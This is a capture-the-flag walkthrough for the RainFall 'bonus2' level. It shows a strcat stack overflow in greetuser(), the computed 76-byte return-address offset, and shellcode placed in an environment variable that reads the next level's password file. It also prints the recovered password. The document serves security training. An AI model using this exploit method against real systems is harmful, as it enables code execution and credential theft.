## Phase 1: Reconnaissance

We find a binary named `bonus2` in the home directory

The program expects exactly two arguments. It prints the first argument after a greeting selected from the `LANG` environment variable:

```console
bonus2@RainFall:~$ LANG=C ./bonus2 ETHAN test
Hello ETHAN

bonus2@RainFall:~$ LANG=nl ./bonus2 ETHAN test
Goedemiddag! ETHAN
```

On the RainFall VM, `LANG` may initially begin with `fi`, which selects the Finnish greeting instead

Supplying long values for both arguments eventually corrupts the return path and crashes the program

---

## Phase 2: Static Analysis

The call site copies 76 bytes onto the stack before calling `greetuser()`. To represent that by-value argument clearly in C, we use a 76-byte wrapper structure:

```c
int language;

struct UserData
{
    char text[76];
};

void greetuser(struct UserData user_data)
{
    char greeting[72] = {0};

    if (language == 1)
        strcpy(greeting, "Hyvää päivää ");
    else if (language == 2)
        strcpy(greeting, "Goedemiddag! ");
    else
        strcpy(greeting, "Hello ");

    strcat(greeting, user_data.text);
    puts(greeting);
}

int main(int argc, char **argv)
{
    struct UserData user_data = {{0}};
    char *lang;

    if (argc != 3)
        return 1;

    strncpy(user_data.text, argv[1], 40);
    strncpy(user_data.text + 40, argv[2], 32);

    lang = getenv("LANG");
    if (lang != NULL && memcmp(lang, "fi", 2) == 0)
        language = 1;
    else if (lang != NULL && memcmp(lang, "nl", 2) == 0)
        language = 2;

    greetuser(user_data);
}
```

The two bounded copies can place up to 72 attacker-controlled bytes in `user_data`. The vulnerability appears in `greetuser()`: it first copies a prefix into a 72-byte local buffer, then appends the controlled data with unbounded `strcat()`

The wrapper structure is only a readable reconstruction of the observed calling convention. The significant fact is that the complete 76-byte value is passed on the stack, not merely as a pointer

---

## Phase 3: Measuring the Stack Layout

The `greetuser()` disassembly places the local destination at `ebp - 0x48`. Saved EIP is at `ebp + 4`, giving this offset:

```text
(ebp + 4) - (ebp - 0x48) = 0x4c = 76 bytes
```

The first byte of the replacement return address must therefore appear at offset 76 in `greeting`

The visible prefix lengths are:

```text
language   prefix             byte length
--------   ----------------   -----------
default    "Hello "           6
fi         Finnish UTF-8      18
nl         "Goedemiddag! "    13
```

We choose Dutch because its 13-byte prefix gives a simple, exact split across the two argument limits

---

## Phase 4: Deriving the Arguments

We set:

```console
export LANG=nl
```

The final `greeting` layout is:

```text
greeting offset   size    contents
---------------   ----    ----------------------------------
0-12              13      "Goedemiddag! "
13-52             40      argv[1] padding
53-75             23      argv[2] padding
76-79             4       replacement return address
80                 1       null byte added by strncpy padding
```

The arithmetic is:

```text
13-byte prefix + 40-byte first argument + 23-byte second padding = 76
```

`argv[2]` contains 23 padding bytes followed by the 4-byte address. Since it is shorter than the 32-byte limit, `strncpy()` pads the rest of that region with null bytes and terminates the combined user string after the address

---

## Phase 5: Storing Shellcode in the Environment

We place the shellcode in an environment variable instead of trying to fit it into the argument overflow:

```console
bonus2@RainFall:~$ export shellcode="$(python resources/shellcode_gen.py)"
```

The generator emits a NOP sled followed by null-free shellcode equivalent to:

```text
execve("/bin/cat", ["/bin/cat", "/home/user/bonus3/.pass"], NULL)
```

It explicitly clears `edx`, making the third `execve()` argument a null environment pointer rather than relying on the register state left by `puts()`

We compile and run the helper after setting both environment variables:

```console
bonus2@RainFall:~$ gcc resources/get_env.c -o /tmp/get_env
bonus2@RainFall:~$ shellcode_address=$(/tmp/get_env)
bonus2@RainFall:~$ echo "$shellcode_address"
0xbfffff09
```

`0xbfffff09` is an example from the documented VM session, not a universal constant. The exact address depends on the environment and executable path. The address returned by a helper process can also differ slightly from its position in `bonus2`, so the NOP sled provides a landing range. If the first value misses, we inspect the environment in GDB and adjust the address within that range

The binary's `GNU_STACK` segment is `RWE`, so code stored in the process-stack environment is executable on this VM

---

## Phase 6: Exploitation

`resources/exploit.py` accepts the measured address and writes the two binary-safe arguments to `/tmp`:

```console
bonus2@RainFall:~$ python resources/exploit.py "$shellcode_address"
Saved to /tmp/bonus2_arg1
Saved to /tmp/bonus2_arg2
```

We execute the binary with those arguments:

```console
bonus2@RainFall:~$ ./bonus2 "$(cat /tmp/bonus2_arg1)" "$(cat /tmp/bonus2_arg2)"
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB...
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

The overwritten return address lands in the environment NOP sled. Execution reaches the shellcode and prints the password for bonus3
